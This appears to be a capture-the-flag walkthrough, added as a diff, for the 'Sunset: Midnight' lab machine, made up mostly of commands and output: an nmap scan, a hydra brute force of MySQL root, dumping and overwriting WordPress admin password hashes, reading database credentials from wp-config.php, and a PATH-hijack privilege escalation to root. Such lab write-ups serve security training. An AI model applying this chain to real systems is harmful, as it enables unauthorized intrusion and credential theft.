@@ -1,0 +1,136 @@
+└─$ nmap -sSCV -p 80,3306 192.168.56.131
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-20 01:57 PDT
+Nmap scan report for 192.168.56.131
+Host is up (0.00041s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-title: Did not follow redirect to http://sunset-midnight/
+3306/tcp open  mysql   MariaDB 5.5.5-10.3.22
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
+|   Thread ID: 14
+|   Capabilities flags: 63486
+|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, ODBCClient, InteractiveClient, Speaks41ProtocolNew, LongColumnFlag, SupportsLoadDataLocal, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: yO_p6X;]E}gliIpw'Xgz
+|_  Auth Plugin Name: mysql_native_password
+
+
+
+└─$ hydra -l root -P /home/ed/Downloads/rockyou.txt  192.168.56.131 mysql -v
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 02:16:22
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking mysql://192.168.56.131:3306/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[3306][mysql] host: 192.168.56.131   login: root   password: robert
+[STATUS] attack finished for 192.168.56.131 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+
+─$ mysql -h 192.168.56.131 -u root -p --skip_ssl
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+
+MariaDB [wordpress_db]> use wordpress_db;
+Database changed
+MariaDB [wordpress_db]> show tables;
++------------------------+
+| Tables_in_wordpress_db |
++------------------------+
+| wp_commentmeta         |
+| wp_comments            |
+| wp_links               |
+| wp_options             |
+| wp_postmeta            |
+| wp_posts               |
+| wp_sp_polls            |
+| wp_term_relationships  |
+| wp_term_taxonomy       |
+| wp_termmeta            |
+| wp_terms               |
+| wp_usermeta            |
+| wp_users               |
++------------------------+
+13 rows in set (0.000 sec)
+
+MariaDB [wordpress_db]> select * from wp_users;
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |
+//it is hard to crack the password
+
+$ echo -n 123456 | md5sum
+e10adc3949ba59abbe56e057f20f883e  
+
+MariaDB [wordpress_db]> update wp_users SET user_pass = e10adc3949ba59abbe56e057f20f883e;
+
+
+find / -perm -u=s 2>/dev/null
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/status  ***
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+www-data@midnight:/var/www/html/wordpress$ cat wp-config.php
+
+/** MySQL database username */
+define( 'DB_USER', 'jose' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+
+jose@midnight:~$ cat user.txt 
+956a9564aa5632edca7b745c696f6575
+
+objdump -s /usr/bin/status
+
+//or 
+strings /usr/bin/status | grep service
+service ssh status
+
+//for service command, does not set full path for it, so we can create a malicious one, and set the path of it to environment varibles, then exec /usr/bin/status, will run the malicious one with root privi. for simple ,the content of service can be "/bin/bash"
+
+jose@midnight:/tmp$ echo "/bin/bash" > service 
+jose@midnight:/tmp$ chmod +x service
+jose@midnight:/tmp$ export PATH=/tmp:$PATH
+jose@midnight:/tmp$ /usr/bin/status
+root@midnight:/root# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
+
+root@midnight:/root# cat root.txt
+          ___   ____
+        /' --;^/ ,-_\     \ | /
+       / / --o\ o-\ \\   --(_)--
+      /-/-/|o|-|\-\\|\\   / | \
+       '`  ` |-|   `` '
+             |-|
+             |-|O
+             |-(\,__
+          ...|-|\--,\_....
+      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
+~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------
+
+db2def9d4ddcb83902b884de39d426e6
+
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)
